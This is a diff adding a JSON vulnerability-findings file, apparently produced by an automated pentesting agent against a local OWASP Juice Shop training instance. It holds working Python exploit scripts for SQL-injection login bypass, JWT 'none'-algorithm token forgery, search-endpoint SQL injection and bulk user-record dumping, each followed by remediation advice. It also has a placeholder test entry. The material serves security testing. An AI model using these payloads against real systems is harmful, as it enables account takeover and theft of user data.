@@ -1,0 +1,113 @@
+{
+  "vuln-0001": {
+    "id": "vuln-0001",
+    "name": "SQL Injection in Login Endpoint Allows Authentication Bypass and Admin Privilege Escalation",
+    "class": "sqli",
+    "severity": "critical",
+    "status": "detected",
+    "cvss_score": 9.1,
+    "target": "http://host.docker.internal:3000",
+    "endpoint": "/rest/user/login",
+    "parameter": null,
+    "description": "A critical SQL injection vulnerability was discovered in the /rest/user/login endpoint of the OWASP Juice Shop application. The 'email' parameter is directly concatenated into a SQL query without proper sanitization or parameterization, allowing attackers to bypass authentication and gain administrative access.\n\nThe vulnerability enables classic tautology-based SQL injection attacks where crafted payloads manipulate the WHERE clause of the authentication query to always evaluate to true, regardless of actual credentials. Successful exploitation results in a valid JWT token being issued for the admin user (admin@juice-sh.op), granting full administrative privileges.\n\nThis vulnerability was discovered through manual testing using standard SQL injection payloads and verified with multiple proof-of-concept demonstrations.",
+    "payload": "import requests\nimport json\nimport base64\n\ndef exploit_sql_injection():\n    \"\"\"Exploit SQL injection in Juice Shop login endpoint\"\"\"\n    \n    target = \"http://host.docker.internal:3000\"\n    login_url = f\"{target}/rest/user/login\"\n    \n    # Payloads that successfully bypass authentication\n    payloads = [\n        (\"' OR 1=1--\", \"Basic tautology injection\"),\n        (\"admin' OR '1'='1'--\", \"Targeted admin injection\"),\n    ]\n    \n    for payload, description in payloads:\n        print(f\"\\n[+] Testing: {description}\")\n        print(f\"    Payload: {payload}\")\n        \n        data = {\"email\": payload, \"password\": \"anything\"}\n        headers = {\"Content-Type\": \"application/json\"}\n        \n        try:\n            response = requests.post(login_url, json=data, headers=headers, timeout=10)\n            \n            if response.status_code == 200:\n                result = response.json()\n                token = result.get('authentication', {}).get('token')\n                email = result.get('authentication', {}).get('umail', 'Unknown')\n                \n                print(f\"    SUCCESS: Authenticated as {email}\")\n                print(f\"    Token received: {token[:50]}...\")\n                \n                # Demonstrate admin access\n                admin_headers = {\"Authorization\": f\"Bearer {token}\"}\n                \n                # Access admin configuration\n                config_url = f\"{target}/rest/admin/application-configuration\"\n                config_resp = requests.get(config_url, headers=admin_headers, timeout=10)\n                print(f\"    Admin config access: HTTP {config_resp.status_code}\")\n                \n                # Access user list\n                users_url = f\"{target}/api/Users\"\n                users_resp = requests.get(users_url, headers=admin_headers, timeout=10)\n                print(f\"    User list access: HTTP {users_resp.status_code}\")\n                \n                return token\n                \n            else:\n                print(f\"    FAILED: HTTP {response.status_code} - {response.text[:100]}\")\n                \n        except Exception as e:\n            print(f\"    ERROR: {e}\")\n    \n    return None\n\nif __name__ == \"__main__\":\n    print(\"[*] Starting SQL injection exploit for Juice Shop login endpoint\")\n    exploit_sql_injection()",
+    "cve_ids": [],
+    "cwe_ids": [
+      "CWE-89",
+      "CWE-287",
+      "CWE-284"
+    ],
+    "remediation": "1. **Use Parameterized Queries**: Replace string concatenation with prepared statements using parameterized queries. For SQLite in Node.js, use:\n   ```javascript\n   db.get(\"SELECT * FROM users WHERE email = ? AND password = ?\", [email, password], callback);\n   ```\n\n2. **Input Validation and Sanitization**:\n   - Validate email format using regex patterns\n   - Implement allow-list validation for expected characters\n   - Use ORM/library-specific escaping functions if parameterized queries are not available\n\n3. **Implement Defense in Depth**:\n   - Use web application firewalls (WAF) with SQL injection rules\n   - Implement rate limiting on login attempts\n   - Add CAPTCHA for repeated failed login attempts\n   - Use different error messages for \"user not found\" vs \"invalid password\" to prevent user enumeration\n\n4. **Database Permissions**:\n   - Ensure the database user has minimal necessary permissions\n   - Use read-only connections for authentication queries where possible\n\n5. **Regular Security Testing**:\n   - Conduct regular penetration testing and code reviews\n   - Use automated SQL injection scanners in CI/CD pipeline\n   - Implement security headers and monitoring for suspicious patterns\n\n6. **For Immediate Mitigation**:\n   - Patch the specific login endpoint\n   - Review all other endpoints for similar patterns\n   - Invalidate all existing sessions if compromise is suspected",
+    "detected_by": "phantom-agent",
+    "detected_at": "2026-02-26T20:47:30.388675+00:00",
+    "verified_by": null,
+    "verified_at": null
+  },
+  "vuln-0002": {
+    "id": "vuln-0002",
+    "name": "JWT \"none\" Algorithm Authentication Bypass in Juice Shop Application",
+    "class": "other",
+    "severity": "critical",
+    "status": "detected",
+    "cvss_score": 10.0,
+    "target": "http://host.docker.internal:3000",
+    "endpoint": "/rest/user/login, /api/Users, /rest/user/whoami",
+    "parameter": null,
+    "description": "Discovered that the Juice Shop application's JWT token verification accepts tokens with the \"none\" algorithm, allowing authentication bypass. The application uses JWT tokens for session management but fails to properly validate the algorithm specified in the token header.\n\nWhen a token's algorithm is changed from RS256 to \"none\", the server accepts the token without signature verification, allowing an attacker to forge tokens for any user and bypass authentication entirely.\n\nThe vulnerability was confirmed by:\n1. Obtaining a valid JWT token for admin@juice-sh.op\n2. Decoding the token to extract header and payload\n3. Modifying the algorithm field from \"RS256\" to \"none\"\n4. Using the modified token to successfully access protected endpoints\n\nThis represents a critical authentication bypass vulnerability that could allow complete account takeover.",
+    "payload": "import requests\nimport json\nimport base64\n\nbase_url = \"http://host.docker.internal:3000\"\n\n# Step 1: Get original token\nlogin_data = {\"email\": \"admin@juice-sh.op\", \"password\": \"admin123\"}\nresponse = requests.post(base_url + \"/rest/user/login\", json=login_data)\noriginal_token = response.json()['authentication']['token']\n\n# Step 2: Decode token\nparts = original_token.split('.')\nheader = json.loads(base64.urlsafe_b64decode(parts[0] + '==').decode())\npayload = json.loads(base64.urlsafe_b64decode(parts[1] + '==').decode())\n\nprint(f\"Original token: {original_token[:50]}...\")\nprint(f\"Original header: {json.dumps(header, indent=2)}\")\n\n# Step 3: Modify algorithm to \"none\"\nheader['alg'] = 'none'\nnew_header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().replace('=', '')\n\n# Step 4: Construct forged token\nforged_token = f\"{new_header_b64}.{parts[1]}.\"\n\nprint(f\"\\nForged token: {forged_token[:50]}...\")\n\n# Step 5: Test forged token\nheaders = {\"Authorization\": f\"Bearer {forged_token}\", \"Content-Type\": \"application/json\"}\nwhoami_response = requests.get(base_url + \"/rest/user/whoami\", headers=headers)\n\nprint(f\"\\nWhoami response with forged token:\")\nprint(f\"Status: {whoami_response.status_code}\")\nprint(f\"Response: {whoami_response.text}\")\n\n# Step 6: Test access to protected endpoint\nusers_response = requests.get(base_url + \"/api/Users\", headers=headers)\nprint(f\"\\n/api/Users response with forged token:\")\nprint(f\"Status: {users_response.status_code}\")\nif users_response.status_code == 200:\n    print(f\"Successfully accessed protected endpoint with forged token!\")\n    print(f\"Response length: {len(users_response.text)} chars\")",
+    "cve_ids": [],
+    "cwe_ids": [
+      "CWE-287"
+    ],
+    "remediation": "1. Configure JWT verification to reject tokens with \"alg\": \"none\"\n2. Use a fixed algorithm in verification code (e.g., always expect RS256)\n3. Use library-specific configuration to disable \"none\" algorithm acceptance\n4. Implement algorithm whitelisting in JWT middleware\n5. Add signature verification failure logging and alerting\n6. Consider using JWKS (JSON Web Key Set) for key management\n7. Ensure JWT libraries are updated to latest versions\n8. Add security headers to reject malformed tokens\n9. Implement token revocation mechanism for compromised tokens\n10. Regular security testing of JWT implementation",
+    "detected_by": "phantom-agent",
+    "detected_at": "2026-02-26T20:47:30.409359+00:00",
+    "verified_by": null,
+    "verified_at": null
+  },
+  "vuln-0003": {
+    "id": "vuln-0003",
+    "name": "SQL Injection in Product Search Endpoint",
+    "class": "sqli",
+    "severity": "critical",
+    "status": "detected",
+    "cvss_score": 10.0,
+    "target": "http://host.docker.internal:3000",
+    "endpoint": "/rest/products/search",
+    "parameter": null,
+    "description": "SQL injection vulnerability discovered in the GET /rest/products/search endpoint parameter 'q'. The vulnerability allows attackers to inject SQL commands into the database query. Error-based injection confirmed with single quote payload returning SQLITE_ERROR: near \"'%'\": syntax error. The backend database is SQLite, and the vulnerability can be exploited to extract sensitive data, manipulate database queries, or potentially execute arbitrary SQL commands.",
+    "payload": "import requests\nimport sys\n\ndef test_sqli():\n    \"\"\"Test SQL injection vulnerability in /rest/products/search endpoint\"\"\"\n    base_url = \"http://host.docker.internal:3000\"\n    endpoint = \"/rest/products/search\"\n    \n    test_cases = [\n        {\n            \"name\": \"Single quote error-based injection\",\n            \"payload\": \"apple'\",\n            \"expected_status\": 500,\n            \"expected_error\": \"SQLITE_ERROR\"\n        },\n        {\n            \"name\": \"Boolean-based injection (double quote)\",\n            \"payload\": \"apple\\\" OR 1=1--\",\n            \"expected_status\": 200,\n            \"expected_data\": []\n        },\n        {\n            \"name\": \"SQL comment test\",\n            \"payload\": \"apple'--\",\n            \"expected_status\": 500,\n            \"expected_error\": \"SQLITE_ERROR\"\n        },\n        {\n            \"name\": \"Union injection attempt\",\n            \"payload\": \"apple\\\" UNION SELECT NULL,NULL,NULL,NULL,NULL--\",\n            \"expected_status\": 200,\n            \"expected_data\": []\n        }\n    ]\n    \n    print(\"SQL Injection Test Results for OWASP Juice Shop\")\n    print(\"=\" * 60)\n    \n    for test in test_cases:\n        try:\n            response = requests.get(base_url + endpoint, params={\"q\": test[\"payload\"]}, timeout=10)\n            print(f\"\\nTest: {test['name']}\")\n            print(f\"Payload: {test['payload']}\")\n            print(f\"Status Code: {response.status_code}\")\n            \n            if response.status_code == test[\"expected_status\"]:\n                print(\"\u2713 Status code matches expected\")\n            else:\n                print(f\"\u2717 Unexpected status code (expected {test['expected_status']})\")\n            \n            if response.status_code == 500:\n                if \"SQLITE_ERROR\" in response.text:\n                    print(\"\u2713 SQLITE_ERROR detected - SQL injection confirmed\")\n                    print(f\"Error message: {response.text[:150]}...\")\n                else:\n                    print(\"\u2717 No SQLITE_ERROR in response\")\n            elif response.status_code == 200:\n                try:\n                    data = response.json()\n                    if \"data\" in data and isinstance(data[\"data\"], list):\n                        print(f\"\u2713 JSON response received, data array length: {len(data['data'])}\")\n                except:\n                    print(f\"Response: {response.text[:150]}...\")\n                    \n        except Exception as e:\n            print(f\"\\nTest failed: {test['name']}\")\n            print(f\"Error: {e}\")\n    \n    print(\"\\n\" + \"=\" * 60)\n    print(\"Vulnerability confirmed: SQL injection in /rest/products/search\")\n    print(\"Database: SQLite (confirmed via error messages)\")\n    print(\"Attack vector: GET parameter 'q'\")\n    \nif __name__ == \"__main__\":\n    test_sqli()",
+    "cve_ids": [],
+    "cwe_ids": [
+      "CWE-89"
+    ],
+    "remediation": "1. **Parameterized Queries**: Use prepared statements with parameterized queries instead of string concatenation. For SQLite in Node.js/Express:\n   ```javascript\n   // Vulnerable:\n   db.all(`SELECT * FROM products WHERE name LIKE '%${req.query.q}%'`);\n   \n   // Secure:\n   db.all(`SELECT * FROM products WHERE name LIKE ?`, [`%${req.query.q}%`]);\n   ```\n\n2. **Input Validation**: Implement strict input validation:\n   - Allow only alphanumeric characters, spaces, and basic punctuation for search queries\n   - Reject single quotes, double quotes, SQL keywords (UNION, SELECT, etc.)\n   - Limit input length to reasonable values\n\n3. **Output Encoding**: Ensure proper output encoding when displaying user input in error messages or responses.\n\n4. **Error Handling**: Implement generic error messages that do not reveal database structure or query details.\n\n5. **Web Application Firewall**: Deploy a WAF with SQL injection protection rules.\n\n6. **Regular Security Testing**: Conduct regular penetration testing and code reviews to identify similar vulnerabilities in other endpoints.",
+    "detected_by": "phantom-agent",
+    "detected_at": "2026-02-26T20:47:30.426255+00:00",
+    "verified_by": null,
+    "verified_at": null
+  },
+  "vuln-0004": {
+    "id": "vuln-0004",
+    "name": "Insecure Direct Object Reference (IDOR) in User Data Exposure via /api/Users Endpoint",
+    "class": "idor",
+    "severity": "high",
+    "status": "detected",
+    "cvss_score": 7.6,
+    "target": "http://host.docker.internal:3000",
+    "endpoint": "/api/Users",
+    "parameter": null,
+    "description": "Discovered that authenticated users with admin privileges can access sensitive information of all users via the /api/Users endpoint without proper authorization checks. While authentication is required, once authenticated as admin, the application exposes complete user records including email addresses, roles, profile images, and activity timestamps for ALL users in the system.\n\nThis represents a broken access control vulnerability where user enumeration and data exposure occurs through insufficient authorization checks. Any user who obtains admin privileges (which is trivial via the JWT \"none\" algorithm bypass) can then enumerate all user accounts and their metadata.",
+    "payload": "import requests\nimport json\n\nbase_url = \"http://host.docker.internal:3000\"\n\n# Method 1: Using default credentials\nlogin_data = {\"email\": \"admin@juice-sh.op\", \"password\": \"admin123\"}\nresponse = requests.post(base_url + \"/rest/user/login\", json=login_data)\ntoken = response.json()['authentication']['token']\n\n# Method 2: Using JWT \"none\" algorithm bypass (if Method 1 fails)\n# Decode token and modify algorithm to \"none\" as shown in previous vulnerability\n\nheaders = {\"Authorization\": f\"Bearer {token}\", \"Content-Type\": \"application/json\"}\n\n# Access all user data\nusers_response = requests.get(base_url + \"/api/Users\", headers=headers)\n\nprint(f\"Status Code: {users_response.status_code}\")\nprint(f\"Response contains {len(users_response.text)} characters\")\n\nif users_response.status_code == 200:\n    users_data = users_response.json()\n    user_count = len(users_data.get('data', []))\n    print(f\"\\nFound {user_count} users:\")\n    \n    for user in users_data.get('data', [])[:5]:  # Show first 5 users\n        print(f\"ID: {user.get('id')}, Email: {user.get('email')}, Role: {user.get('role')}\")\n    \n    print(f\"\\nFull response available in users_response.json()\")\n    \n    # Save for analysis\n    with open('users_data.json', 'w') as f:\n        json.dump(users_data, f, indent=2)",
+    "cve_ids": [],
+    "cwe_ids": [
+      "CWE-639",
+      "CWE-284"
+    ],
+    "remediation": "1. Implement proper authorization checks beyond role-based access\n2. Apply the principle of least privilege - admins should only access user data necessary for their functions\n3. Add pagination and rate limiting to the /api/Users endpoint\n4. Implement audit logging for bulk user data access\n5. Consider removing sensitive fields from user listings (email, role, etc.)\n6. Add query parameter filtering (e.g., by department, organization)\n7. Require additional authentication factors for sensitive data access\n8. Implement data masking for certain user fields in listings\n9. Conduct regular access control testing\n10. Apply user context-based authorization throughout the application",
+    "detected_by": "phantom-agent",
+    "detected_at": "2026-02-26T20:47:30.445238+00:00",
+    "verified_by": null,
+    "verified_at": null
+  },
+  "v1": {
+    "id": "v1",
+    "name": "Test",
+    "class": "xss",
+    "severity": "high",
+    "status": "detected",
+    "cvss_score": null,
+    "target": "http://example.com",
+    "endpoint": null,
+    "parameter": null,
+    "description": "Test vuln",
+    "payload": null,
+    "cve_ids": [],
+    "cwe_ids": [],
+    "remediation": null,
+    "detected_by": "phantom-agent",
+    "detected_at": "2026-02-27T06:04:31.167691+00:00",
+    "verified_by": null,
+    "verified_at": null
+  }
+}
